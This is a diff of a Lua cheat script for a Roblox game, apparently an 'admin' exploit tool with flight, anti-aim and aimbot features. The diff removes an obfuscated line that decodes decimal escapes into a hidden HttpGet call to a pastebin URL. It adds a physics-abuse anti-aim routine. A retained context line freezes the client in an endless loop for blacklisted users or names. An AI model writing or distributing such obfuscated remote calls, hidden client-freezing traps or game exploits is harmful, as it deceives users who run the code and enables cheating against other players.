@@ -411,7 +411,6 @@ coroutine.resume(coroutine.create(function()
 	workspace.FallenPartsDestroyHeight = -50000
 	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
 	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
-	loadstring('\32\32\32\32\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\85\78\90\80\57\117\57\114\34\41\10')()
 	if workspace:FindFirstChild'Armoured Truck' then 
 	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
 	    workspace:FindFirstChild'Armoured Truck':Destroy()
@@ -656,6 +655,7 @@ if not Torso then return end
 	BodyGyro.CFrame = Torso.CFrame
 	BodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
 	BodyVelocity.Velocity = Vector3.new(0,0.1,0)
+	BodyVelocity.Name = "CyAdminFly"
 	local Table1 = {['W'] = 0;['A'] = 0;['S'] = 0;['D'] = 0;}
 	if not AirwalkOn then 
 		CheckCommand("airwalk")
@@ -2110,29 +2110,34 @@ AddCommand(function(Arguments)
 	if Arguments[1] then 
 		local Player = PlrFinder(Arguments[1])
 		if Player then 
-			if Arguments[2] == "os" then 
-				notif(Player.Name,"is on "..Player.OsPlatform,5,nil)
-			elseif Arguments[2] == "age" then 
-				notif(Player.Name,"has the account age of "..Player.AccountAge,5,nil)
-			else
-				notif(Player.Name,"is on "..Player.OsPlatform.." and has the account age of "..Player.AccountAge,5,nil)
-			end
+			notif(Player.Name,"has the account age of "..Player.AccountAge,5,nil)
 		end
 	end
-end,"playerinfo",{"info"},"[Player] [Os/Age(optional)]")
+end,"playerinfo",{"info"},"Returns a players age","[No Args]")
 
 AddCommand(function(Arguments)
 	AntiAim = not AntiAim
 	if not AntiAim then
 		stopAnim("215384594")
 		stopAnim("188632011")
+		for i,v in pairs(GetChar().Torso:GetChildren()) do 
+			if v:IsA'BodyVelocity' and v.Name ~= "CyAdminFly" then 
+				v:Destroy()
+			end 
+		end 
 	else
+		for i = 1,500 do
+			local BodyV = Instance.new("BodyVelocity",GetChar().Torso)
+			BodyV.MaxForce = Vector3.new(100,100,100)
+			BodyV.P = math.huge
+			BodyV.Velocity = Vector3.new(math.huge,math.huge,math.huge)
+		end
 		if Arguments[1] and Arguments[1] == "spin" then
 			local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
 			while AntiAim and GetChar():FindFirstChild'Humanoid' and GetChar().Humanoid.Health > 0 and wait() do
 				stopAnim("188632011")
 				Track:play(0.1,1,10)
-			end 
+			end
 		else
 			stopAnim("215384594")
 			stopAnim("188632011")
@@ -3276,7 +3281,7 @@ end))
 -- [[ End ]] --
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: nXcZH36)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","New Aimbot",10,nil)
+notif("Newest Update","forgot I had this antiaim method lol",10,nil)
 
 if LP:IsInGroup(5152759) or string.find(LP.Name:lower(),"lynx") or BlacklistTable[LP.UserId] then
 	while true do end
